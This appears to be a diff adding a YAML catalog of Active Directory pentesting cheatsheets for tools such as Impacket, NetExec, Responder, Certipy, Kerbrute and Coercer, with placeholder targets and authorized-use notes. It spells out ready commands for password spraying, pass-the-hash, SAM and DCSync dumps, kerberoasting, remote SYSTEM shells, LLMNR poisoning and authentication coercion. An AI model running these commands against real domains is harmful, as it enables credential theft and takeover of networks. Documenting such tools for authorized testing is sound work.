@@ -1,0 +1,155 @@
+# Active Directory — guided-ops cheatsheets for the existing Python "Active
+# Directory Tools" collection, plus one missing staple (ldapdomaindump) and an
+# AD attack-methodology reference. Overlays enrich existing tools by EXACT
+# title. Commands are canonical, non-invented; domain/host are placeholders.
+category:
+  title: "Active Directory (catalog)"
+  merge_into: "Active Directory Tools"
+
+# --- enrich existing Python-defined tools by title --------------------------
+overlay:
+  - title: "BloodHound (AD Attack Paths)"
+    tags: [active-directory, enumeration, lateral-movement, credentials]
+    usage:
+      - ["start the neo4j database", "sudo neo4j start"]
+      - ["collect all data (SharpHound-Python)", "bloodhound-python -d domain.local -u user -p pass -c all -ns 10.10.10.10"]
+      - ["collect naming a DC explicitly", "bloodhound-python -d domain.local -u user -p pass -c all -dc dc01.domain.local"]
+      - ["show collector options", "bloodhound-python --help"]
+    lab_safe_notes: >-
+      Collection queries LDAP/SMB with credentials you were issued and generates
+      JSON you import into the BloodHound UI to map attack paths. Only run against a
+      domain you are explicitly authorized to assess or your own lab domain.
+
+  - title: "NetExec — nxc (Network Pentesting)"
+    tags: [active-directory, network, enumeration, credentials, password-attack]
+    system_pkgs: {which: nxc}
+    usage:
+      - ["authenticate over SMB", "nxc smb 10.10.10.0/24 -u user -p pass"]
+      - ["null session — list shares", "nxc smb 10.10.10.10 -u '' -p '' --shares"]
+      - ["password-spray a user list", "nxc smb 10.10.10.10 -u users.txt -p 'Winter2024!'"]
+      - ["enumerate domain users", "nxc smb 10.10.10.10 -u user -p pass --users"]
+      - ["pass-the-hash", "nxc smb 10.10.10.10 -u admin -H <nthash>"]
+      - ["dump SAM (needs local admin)", "nxc smb 10.10.10.10 -u admin -p pass --sam"]
+    lab_safe_notes: >-
+      nxc authenticates and enumerates Windows/AD hosts; spraying and hash-dumping are
+      credential attacks. Sweeping a whole subnet touches every host in it — confirm the
+      full range is in scope. Authorized engagements or your own lab only.
+
+  - title: "Impacket (Network Protocol Tools)"
+    tags: [active-directory, credentials, network, lateral-movement, kerberos]
+    system_pkgs: {which: impacket-smbclient}
+    usage:
+      - ["kerberoast — request service TGS", "impacket-GetUserSPNs domain.local/user:pass -dc-ip 10.10.10.10 -request"]
+      - ["AS-REP roast users with no pre-auth", "impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10"]
+      - ["dump secrets / DCSync", "impacket-secretsdump domain.local/user:pass@10.10.10.10"]
+      - ["semi-interactive shell as SYSTEM", "impacket-psexec domain.local/admin:pass@10.10.10.10"]
+      - ["command exec over WMI", "impacket-wmiexec domain.local/admin:pass@10.10.10.10"]
+      - ["interactive SMB client", "impacket-smbclient domain.local/user:pass@10.10.10.10"]
+    lab_safe_notes: >-
+      Kerberoasting, AS-REP roasting, secretsdump and the *exec modules are active
+      credential-theft and remote-execution attacks against a domain. Run only where you
+      have written authorization or in your own lab domain.
+
+  - title: "Responder (LLMNR/NBT-NS Poisoner)"
+    tags: [active-directory, credentials, mitm, sniffing, network, poisoning, relay]
+    system_pkgs: {which: responder, apt: responder}
+    usage:
+      - ["poison LLMNR/NBT-NS/MDNS on an interface", "sudo responder -I eth0"]
+      - ["passive analyze mode (no poisoning)", "sudo responder -I eth0 -A"]
+      - ["enable rogue WPAD proxy", "sudo responder -I eth0 -w"]
+      - ["show options", "responder -h"]
+    lab_safe_notes: >-
+      Responder answers broadcast name-resolution requests to capture NetNTLM hashes
+      (logged under /usr/share/responder/logs). It actively poisons the local segment and
+      affects every host on it — only run on a network you are authorized to attack. Use
+      -A analyze mode first to observe without poisoning.
+
+  - title: "Certipy (AD Certificate Abuse)"
+    tags: [active-directory, credentials, privesc, enumeration, adcs]
+    usage:
+      - ["find vulnerable cert templates", "certipy find -u user@domain.local -p pass -dc-ip 10.10.10.10 -vulnerable"]
+      - ["request a certificate from a template", "certipy req -u user@domain.local -p pass -ca CA-NAME -template TemplateName -dc-ip 10.10.10.10"]
+      - ["authenticate with a PFX (get TGT / NT hash)", "certipy auth -pfx user.pfx -dc-ip 10.10.10.10"]
+      - ["show help", "certipy --help"]
+    lab_safe_notes: >-
+      Certipy enumerates and abuses AD Certificate Services (ESC1-ESC8) to escalate
+      privileges or forge authentication. Requesting/abusing certificates is an active
+      attack — authorized engagements or your own lab CA only.
+
+  - title: "Kerbrute (Kerberos Brute Force)"
+    tags: [active-directory, bruteforce, password-attack, enumeration, credentials, kerberos]
+    usage:
+      - ["enumerate valid usernames", "kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt"]
+      - ["password-spray a user list", "kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password1'"]
+      - ["brute-force one user's password", "kerbrute bruteuser -d domain.local --dc 10.10.10.10 passwords.txt username"]
+      - ["show help", "kerbrute --help"]
+    lab_safe_notes: >-
+      Kerbrute uses Kerberos pre-auth, so username enumeration is quiet, but spraying and
+      brute-force can lock out domain accounts — mind the lockout policy. Authorized
+      engagements or your own lab domain only.
+
+# --- genuinely-missing, widely-used AD tool ---------------------------------
+tools:
+  - title: "ldapdomaindump (AD LDAP Dumper)"
+    kind: install
+    tags: [active-directory, enumeration, credentials]
+    description: "Dumps AD users, groups, computers, policies and trusts over LDAP into browsable HTML/JSON/greppable output — great for offline domain enumeration."
+    system_pkgs: {which: ldapdomaindump}
+    install: {pip: ldapdomaindump}
+    run: ["ldapdomaindump --help"]
+    project_url: "https://github.com/dirkjanm/ldapdomaindump"
+    usage:
+      - ["dump the domain to ./ (HTML/JSON/grep)", "ldapdomaindump -u 'DOMAIN\\user' -p pass 10.10.10.10"]
+      - ["write output to a directory", "ldapdomaindump -u 'DOMAIN\\user' -p pass -o out/ 10.10.10.10"]
+      - ["resolve computer hostnames too", "ldapdomaindump -u 'DOMAIN\\user' -p pass -r 10.10.10.10"]
+    lab_safe_notes: >-
+      Authenticated LDAP reads are low-impact enumeration, but they still use domain
+      credentials against a live DC — run only against a domain you are authorized to
+      assess or your own lab. Point -o at an empty directory.
+
+  - title: "Coercer (Authentication Coercion)"
+    kind: install
+    tags: [active-directory, relay, privesc, credentials]
+    description: >-
+      Automatically coerces a Windows host to authenticate to an attacker-controlled
+      listener across many RPC methods (MS-RPRN / PetitPotam / DFSCoerce / …), feeding
+      NTLM relay or hash capture.
+    system_pkgs: {which: coercer}
+    install: {pip: coercer}
+    run: ["coercer --help"]
+    project_url: "https://github.com/p0dalirius/Coercer"
+    usage:
+      - ["scan which coercion methods work", "coercer scan -u user -p pass -d domain.local -t 10.10.10.10"]
+      - ["coerce auth to your listener", "coercer coerce -u user -p pass -d domain.local --target 10.10.10.10 --listener-ip 10.10.14.1"]
+      - ["show help", "coercer --help"]
+    lab_safe_notes: >-
+      Coercion forces a target to authenticate to you — pair it with Responder / ntlmrelayx
+      to capture or relay those credentials. It actively triggers auth on a live host, so
+      authorized targets only. Run `scan` first to see what's exploitable before `coerce`.
+
+  - title: "PCredz (Credential Extractor)"
+    kind: install
+    tags: [active-directory, credentials, sniffing, pcap, kerberos]
+    description: >-
+      Harvests credentials from live traffic or pcap files — NTLM (HTTP/SMB/LDAP/SQL),
+      Kerberos AS-REQ, and even credit-card numbers. Great for mining Responder / relay
+      captures.
+    system_pkgs: {which: Pcredz}
+    install: {git: "https://github.com/lgandx/PCredz.git"}
+    run: ["./Pcredz -h"]
+    project_url: "https://github.com/lgandx/PCredz"
+    usage:
+      - ["parse a single pcap", "./Pcredz -f capture.pcap"]
+      - ["parse a directory of pcaps", "./Pcredz -d ./pcaps/"]
+      - ["live capture on an interface (root)", "sudo ./Pcredz -i eth0"]
+    lab_safe_notes: >-
+      Parsing your own pcap files is passive and safe. Live capture needs root and only
+      sees traffic on a network you're authorized to monitor. Depends on pcapy-ng
+      (`pip3 install pcapy-ng`, plus libpcap-dev). Feeds nicely off Responder captures.
+
+# --- high-value AD attack reference -----------------------------------------
+  - title: "The Hacker Recipes (AD)"
+    kind: resource
+    tags: [reference, active-directory, learning]
+    description: "Maintained, well-organized methodology for Active Directory attacks — recon, movement, credential theft, Kerberos and ADCS — with the exact tool commands for each step."
+    url: "https://www.thehacker.recipes/"
